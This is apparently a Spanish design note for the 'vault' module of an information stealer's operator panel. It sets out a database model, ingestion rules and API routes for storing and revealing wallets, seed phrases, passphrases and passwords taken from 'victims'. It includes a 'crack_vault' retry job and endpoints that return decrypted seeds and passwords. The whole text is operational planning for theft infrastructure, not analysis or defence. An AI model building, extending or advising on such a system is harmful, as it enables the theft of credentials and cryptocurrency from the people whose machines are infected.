# Bóveda de material (0.3.7)

Modelo aditivo para persistir wallets, seeds, claves, passphrases y credenciales
sin romper el contrato v1 ni el JSON actual del agente.

## Identidad y cifrado

- `Wallet` conserva `@@unique([victimId, path])`; las rutas se normalizan
  (minúsculas, `/`, segmentos sin espacios) antes de cualquier upsert.
- `WalletSecret` deduplica por `(walletId, kind, valueHash)`; `valueEnc` usa
  `sealSecret` y `valueHash` es SHA-256 del valor.
- `Credential` deduplica por `(victimId, targetId, path, username)`.
- Estados de wallet: `found`, `locked`, `no_vault`, `decrypted`, `failed`,
  `unsupported`, `corrupt`. Un estado más fuerte no se degrada con un escaneo
  que no vea el vault.
- Un secreto hallado no se borra porque un escaneo posterior no lo repita.

## Ingesta

`indexArtifact`, `indexWalletJson`, `applyTaskResult` y `applyEvent` usan
`server/services/vault.ts`. Se aceptan tanto el JSON actual (`wallets`,
`seeds`, `findings`, `credentials.json`) como el formato legacy. `secret_found`
se deduplica por `(victimId, kind, sha256(value))` en 24 h y guarda el valor
solo en la bóveda.

## API

| Ruta | Uso |
|---|---|
| `GET /victims/:id/vault` | grupos por target, contadores y último escaneo |
| `GET /vault` | agregado global con filtros de cadena, estado y balance |
| `GET /vault/wallets/:walletId` | detalle y secretos enmascarados |
| `GET /vault/wallets/:walletId/reveal?kind=seed` | valor descifrado, `no-store` |
| `POST /vault/wallets/:walletId/retry` | reencola `crack_vault` y audita |
| `GET /vault/credentials` | credenciales globales paginadas |
| `GET /vault/credentials/:id/reveal` | contraseña descifrada, `no-store` |
| `GET /victims/:id/credentials` | credenciales de una víctima |

Cada revelado se audita en la misma transacción que registra el acceso. Las
mutaciones (reintento) también auditan dentro de la transacción.
